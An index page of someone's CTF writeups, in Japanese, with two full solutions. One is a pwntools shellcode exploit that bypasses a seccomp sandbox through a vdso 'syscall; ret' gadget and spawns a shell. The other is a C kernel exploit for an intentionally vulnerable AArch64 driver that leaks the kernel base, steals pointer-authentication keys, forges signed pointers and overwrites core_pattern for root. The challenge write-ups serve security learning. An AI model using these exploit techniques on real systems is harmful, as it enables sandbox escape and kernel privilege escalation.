---
layout: page
title: CTF Writeups
nav_order: 3
description: "Collection of CTF competition writeups"
permalink: /writeups/
has_children: true
---

# CTF Writeups

This section contains writeups for various Capture The Flag (CTF) competitions I've participated in. These documents explain my approach, techniques used, and solutions for various security challenges.

## Available Writeups

- [SECCON 2022](/writeups/SECCON)
- [TSG LIVE 9 CTF](/writeups/TSG_LIVE_9)
- [ASIS CTF 2023](/writeups/ASIS_CTF_2023)
- [vsCTF 2023](/writeups/vsCTF2023)
- [DEFCON Quals 2024](/writeups/DEFCON-quals-2024)
- [SECCON 2024 Quals](/writeups/SECCON-quals-2024)
- [SECCON 2024 Final](/writeups/SECCON-final-2024)
- [AlpacaHack Round 10](/writeups/AlpacaHack-Round-10)
- [TsukuCTF 2025](/writeups/TsukuCTF2025)
- [IERAE CTF 2025](/writeups/IERAE_CTF_2025)

## Misc Writeups

### cornCTF 2025 -- he protecc

バイナリが渡される。
`READ | WRITE| EXEC` な領域が、固定アドレス`0x500000`に取られ、任意のコードを書き込み実行できる。

```plaintext
      0x400000           0x401000 r--p     1000      0 protected
      0x401000           0x4a2000 r-xp    a1000   1000 protected
      0x4a2000           0x4ca000 r--p    28000  a2000 protected
      0x4ca000           0x4cf000 r--p     5000  ca000 protected
      0x4cf000           0x4d1000 rw-p     2000  cf000 protected
      0x4d1000           0x4d7000 rw-p     6000      0 [anon_004d1]
      0x4d7000           0x4f9000 rw-p    22000      0 [heap]
      0x500000           0x501000 rwxp     1000      0 [anon_00500]
0x7ffff7ff7000     0x7ffff7ffb000 r--p     4000      0 [vvar]
0x7ffff7ffb000     0x7ffff7ffd000 r--p     2000      0 [vvar_vclock]
0x7ffff7ffd000     0x7ffff7fff000 r-xp     2000      0 [vdso]
0x7ffffffdd000     0x7ffffffff000 rw-p    22000      0 [stack]
```

しかし、SECCOMPによってあらゆるシステムコールが禁止されている。

```plaintext
 0000: 0x20 0x00 0x00 0x00000008  A = instruction_pointer
 0001: 0x01 0x00 0x00 0x003fffff  X = 4194303 # 0x3fffff
 0002: 0x2d 0x00 0x0a 0x00000000  if (A <= X) goto 0013
 0003: 0x01 0x00 0x00 0x004b7fff  X = 4947967 # 0x4b7fff
 0004: 0x2d 0x00 0x07 0x00000000  if (A <= X) goto 0012
 0005: 0x01 0x00 0x00 0x004fffff  X = 5242879 # 0x4fffff
 0006: 0x2d 0x00 0x06 0x00000000  if (A <= X) goto 0013
 0007: 0x01 0x00 0x00 0x00500fff  X = 5246975 # 0x500fff
 0008: 0x2d 0x00 0x03 0x00000000  if (A <= X) goto 0012
 0009: 0x20 0x00 0x00 0x0000000c  A = instruction_pointer >> 32
 0010: 0x01 0x00 0x00 0x00007fff  X = 32767   # 0x7fff
 0011: 0x2d 0x00 0x01 0x00000000  if (A <= X) goto 0013
 0012: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

システムコールが実行可能なのは`vdso`領域ぐらいだが、ここには

```
0x0000000000000fad: syscall; ret;
```

こんなガジェットがある。また、`vdso`のベースアドレスは`_dl_sysinfo_dso`からリークできる。

ただ、`vdso`はカーネルによって異なるので、シェルコード内で該当の命令を探し、それをガジェットとして使う。

```bash
$ asm -c amd64 'syscall; ret'
0f05c3
```

あとはいい感じに飛べば良い。

<details>
<summary>
exploit.py
</summary>

```py
from typing import List, Any, Dict
import time
from pwn import context, gdb, ELF, shellcraft, tube, pack, unpack, log, process, p64, p32, SigreturnFrame, ROP, asm, disasm, remote
from libpwncof import PayloadBuffer, LabelRef, create_ucontext

context.terminal = ["tmux", "splitw", "-h"]
context.log_level = "debug"
# context.log_level = "info"

path = "./protected"
elf = ELF(path)
context.binary = elf

# io: tube = gdb.debug(path)
# io: tube = remote('he-protecc.challs.cornc.tf', 1337, ssl=True)
io: tube = process(path)
# io: tube = remote("127.0.0.1", 10000)

# -1f05c3: syscall; ret

code = f"""
    mov r15, [{elf.symbols['_dl_sysinfo_dso']}]

check:
    cmp byte ptr [r15 + 0], 0x0f
    jne fail
    cmp byte ptr [r15 + 1], 0x05
    jne fail
    cmp byte ptr [r15 + 2], 0xc3
    jne fail

    jmp found

fail:
    inc r15
    jmp check

found:
    mov rdi, 0x501000
    mov rsi, 0x1000
    mov rdx, 0x7
    mov r10, 0x22
    mov r8, 0xffffffff
    mov r9, 0
    mov rax, 9
    call r15

    mov rdi, 0
    mov rsi, 0x501000
    mov rdx, 0x1000
    mov rax, 0
    call r15

    mov r15, 0x501000
    jmp r15
"""

a = asm(code)

io.recvuntil("How")
io.sendline(str(len(a)).encode())

io.send(a)

time.sleep(1)
code2 = shellcraft.sh()
a = asm(code2)

io.send(a)
time.sleep(1)

io.interactive()
```

</details>


# Midnight Flag 2025 -- SecMem

AArch64のLinux上に次のようなカーネルモジュールが差し込まれる。

<details>
<summary>sec_mem.c</summary>


```c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/cdev.h>
#include <linux/device.h>
#include <linux/mutex.h>

#define DEVICE_NAME "sec_mem"
#define BUFFER_SIZE 1024
#define MAX_FUNC_NAME 64

typedef ssize_t (*buffer_op_fn)(void *buffer, const void *data, size_t len, int64_t offset);

struct sec_mem_buffer {
    char buffer[BUFFER_SIZE];
    buffer_op_fn ops[3]; 
};

static struct sec_mem_buffer device_global_struct;

struct sec_mem_ioctl_data {
    size_t length;
    uint64_t op_index; 
    char buffer[BUFFER_SIZE];
    int64_t offset;
};

static int major_number;
static struct class *sec_mem_class = NULL;
static struct cdev sec_mem_cdev;

static struct mutex mutex;


struct sec_mem_ioctl_data data;

static int sec_mem_release(struct inode *inode, struct file *file) {
    mutex_unlock(&mutex);
    pr_info("sec_mem_dev: Device closed\n");
    return 0;
}

ssize_t buffer_copy_from_user(void *buffer, const void *data, size_t len, int64_t offset) {
    if (len > sizeof(struct sec_mem_buffer)) {
        return -EINVAL;
    }
    memcpy(buffer, data, len);
    return len;
}

ssize_t buffer_copy_to_user(void *buffer, const void *data, size_t len, int64_t offset) {
    if (len > sizeof(struct sec_mem_buffer)) {
        return -EINVAL;
    }
    memcpy(data, buffer + offset, len);
    return len;
}

ssize_t buffer_clear(void *buffer, const void *data, size_t len, int64_t offset) {
    memset(buffer, 0, BUFFER_SIZE);  
    return BUFFER_SIZE;  
}

#define sec_mem_IOC_MAGIC 'k'
#define sec_mem_IOC_SET_OPERATION _IOW(sec_mem_IOC_MAGIC, 3, unsigned int)

static void *paciza(void *ptr) {
    __asm__ volatile (
        "paciza %0" 
	: "+r" (ptr)    
    );
    return ptr;
}


static void *autiza(void *ptr) {
    __asm__ volatile (
        "autiza %0"  
	: "+r" (ptr)    
    );
    return ptr;  
}

static void sec_mem_init_ops(void) {
    device_global_struct.ops[0] = buffer_copy_from_user;
    device_global_struct.ops[1] = buffer_copy_to_user; 
    device_global_struct.ops[2] = buffer_clear;

    for (int i = 0; i < 3; i++) {
        device_global_struct.ops[i] = paciza(device_global_struct.ops[i]);
    }
}

static int sec_mem_open(struct inode *inode, struct file *file) {
    if (!mutex_trylock(&mutex)) {
        pr_err("Device is already open!\n");
        return -EBUSY;
    }

    sec_mem_init_ops();
    return 0;
}

static long sec_mem_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {

    if (cmd == sec_mem_IOC_SET_OPERATION) {
        if (copy_from_user(&data, (struct sec_mem_ioctl_data *)arg, sizeof(data))) {
            return -EFAULT;
        }

        if (data.op_index >= 3) { 
            return -EINVAL;
        }

	void *auth_ptr = autiza(device_global_struct.ops[data.op_index]);

        if (!auth_ptr) {
            return -EACCES; 
        }

        buffer_op_fn op = (buffer_op_fn)auth_ptr;
        ssize_t result = op(device_global_struct.buffer, &data.buffer, data.length, data.offset);
        if (result < 0) {
            return result;
        }

        if (copy_to_user(arg, &data, sizeof(data))){
            return -EFAULT;
        }

        return 0;
    }

    return -EINVAL;
}

static char *sec_mem_devnode(const struct device *dev, umode_t *mode) {
    if (mode)
        *mode = 0666;
    return NULL;
}

static struct file_operations fops = {
    .owner = THIS_MODULE,
    .open = sec_mem_open,
    .release = sec_mem_release,
    .unlocked_ioctl = sec_mem_ioctl,  
};


static int __init sec_mem_init(void) {
    mutex_init(&mutex);
    
    major_number = register_chrdev(0, DEVICE_NAME, &fops);
    if (major_number < 0) {
        pr_err("sec_mem_dev: Failed to register a major number\n");
        return major_number;
    }

    sec_mem_class = class_create("sec_mem_class");
    if (IS_ERR(sec_mem_class)) {
        unregister_chrdev(major_number, DEVICE_NAME);
        pr_err("sec_mem_dev: Failed to register device class\n");
        return PTR_ERR(sec_mem_class);
    }
    sec_mem_class->devnode = sec_mem_devnode;

    device_create(sec_mem_class, NULL, MKDEV(major_number, 0), NULL, DEVICE_NAME);
    cdev_init(&sec_mem_cdev, &fops);
    cdev_add(&sec_mem_cdev, MKDEV(major_number, 0), 1);
    
    return 0;
}

static void sec_mem_exit(void) {
    device_destroy(sec_mem_class, MKDEV(major_number, 0));  
    cdev_del(&sec_mem_cdev);  
    class_destroy(sec_mem_class);  
    unregister_chrdev(major_number, DEVICE_NAME);  
}


module_init(sec_mem_init);


MODULE_LICENSE("GPL");
MODULE_AUTHOR("Itarow");
MODULE_DESCRIPTION("secure memory driver");
```

</details>

脆弱性は3つ。

- `buffer_copy_*`が、ユーザからのコピー関数ではなく`memcpy`を使っている。
- `buffer_copy_to_user`の`offset`のチェックがない
- `buffer_copy_*`の境界チェックが、本来バッファサイズと比較するべきところ、`ops`の分も入れてしまっている。

さて、１つ目の２つ目の脆弱性を使うことで、バッファの外の値を読み出すことができる。例えば、`offset=1024`とすればバッファの外の、`ops`からリードができる。そこら辺の適当なポインタがカーネルを指しているので、モジュールのロードアドレスとカーネルのベースアドレスをリークできる。

２つがリークできたら、適当な計算によってカーネルに対するAARが手に入る。`ops`を置き換えて`rip`を取りたいが、armのポインタ認証によって暗号化されているため、単純な関数ポインタの書き換えはできない。
ところで、ポインタ認証のための鍵は、`task_struct`に保存されている。`init`からプロセスを手繰っていき、自身の構造体の鍵をリークすることができる。
ただ、ポインタと鍵から認証済みポインタを作るのは少し面倒だったので、私が開発している[libkpwn](https://github.com/Iwancof/libkpwn/blob/master/src/aarch64/pauth.c)というライブラリに、認証用のコードを書いた。

これで好きな関数を呼び出すことができる。armなのでROPは難しく、良さそうなガジェットを探していたところ、次のようなガジェットを発見した。

```
0x000000000006ee34: str x2, [x3]; ret;
```

第二引数、第三引数はユーザが自由に渡すことができるため、これによってAAWも実現した。
最後に`core_pattern`を書き換え、root権限を取る。

最終的なexploitを以下に示す。


<details>
<summary>
exploit.c
</summary>

```c
#define _GNU_SOURCE

#include <kpwn/prelude.h>

#include <fcntl.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/uio.h>
#include <unistd.h>

#define BUFFER_SIZE 1024

struct sec_mem_ioctl_data {
  size_t length;
  uint64_t op_index;
  char buffer[BUFFER_SIZE];
  int64_t offset;
};

void *buf_base = NULL;
int fd;

void *aar(void *kptr) {
  struct sec_mem_ioctl_data data;
  data.op_index = 1;
  data.length = 1024;
  memset(data.buffer, 0, 1024);
  data.offset = -(int64_t)buf_base + (int64_t)kptr;

  SYSCHK(ioctl(fd, 0x40046b03, &data));

  void *content = calloc(1, 1024);
  memcpy(content, data.buffer, 1024);

  return content;
}

int main(int argc, char **argv) {
  noaslr(argc, argv);

  set_process_name("exploit");

  init_billy(argv);

  setbuf(stdout, NULL);
  setbuf(stderr, NULL);
  setbuf(stdin, NULL);

  log_level = LOG_INFO;

  log_info("start pwning");

  fd = SYSCHK(open("/dev/sec_mem", O_RDWR));

  struct sec_mem_ioctl_data data;
  data.op_index = 1;
  data.length = 1024;
  memset(data.buffer, 0, 1024);
  data.offset = 1024;

  SYSCHK(ioctl(fd, 0x40046b03, &data));

  hexdump(log_info, data.buffer, 0x30);
  void **leaks = (void **)data.buffer;
  log_info("copy_from_user: %p", leaks[0]);
  log_info("copy_to_user: %p", leaks[1]);
  log_info("clear: %p", leaks[2]);

  void *kbase = leaks[10] - 0xb894e8;
  buf_base = leaks[6] - 0x430;

  set_kbase(kbase);
  log_success("buf_base = %p", buf_base);

  // init_task: 0xb019c0
  // list: 0x338
  // name: 0x5e8
  // key: 0xf28

  void *task = kbase + 0xb019c0;
  while (1) {
    char *name = aar(task + 0x5e8);
    // log_info("checking task %p, name: %s", task, name);

    if (strcmp(name, "exploit") == 0) {
      log_success("task found at %p", task);
      free(name);
      break;
    }
    free(name);

    void **next = aar(task + 0x338);
    if (next[0] == NULL) {
      log_error("task not found");
      return -1;
    }

    task = next[0] - 0x338;
    free(next);
  }

  uint64_t *keys = aar(task + 0xf28);

  uint64_t lo = keys[0];
  uint64_t hi = keys[1];
  free(keys);

  log_success("found pac-keys! lo: 0x%lx, hi: 0x%lx", lo, hi);

  pauth_key key;
  key.lo = lo;
  key.hi = hi;

  uint64_t clear_func = (uint64_t)(buf_base - 0x2504);
  uint64_t clear_pacced = pauth_addpac(clear_func, 0, key);
  uint64_t clear_leaked = (uint64_t)leaks[2];

  log_info("checking pac keys: ours: `buffer_clear`: 0x%lx, leaked: 0x%lx",
           clear_pacced, clear_leaked);
  ASSERT_MSG(clear_pacced == clear_leaked,
             "clear_func pacced does not match leaked clear_func");

  // 0x000000000006ee34: str x2, [x3]; ret;
  uint64_t gadget = 0x000000000006ee34 + (uint64_t)kbase;

  log_info("gadget at 0x%lx", gadget);

  uint64_t pac = pauth_addpac(gadget, 0, key);
  log_info("pacced gadget: 0x%lx", pac);

  struct kbuf {
    size_t length;
    uint64_t op_index;
    char s[1024];
    union {
      void *ops[3];
      int64_t offset;
    };
  } buf;

  buf.length = 1024 + 8 * 1;
  buf.op_index = 0;
  memset(buf.s, 0, sizeof(buf.s));
  buf.ops[0] = (void *)pac;

  SYSCHK(ioctl(fd, 0x40046b03, &buf));

  uint64_t write_data = pc64("|/tmp/x");
  uint64_t dest = 0xb8a560 + (uint64_t)kbase; // core pattern

  buf.op_index = 0;

  buf.length = write_data; // x2
  buf.offset = dest;       // x3

  ioctl(fd, 0x40046b03, &buf); // ignore error

  trigger_corewin("/tmp/x", LPE_BILLY);
}
```

</details>

![sec_mem_solved](https://raw.githubusercontent.com/Iwancof/about-me/main/writeups/sec_mem_solved.png)
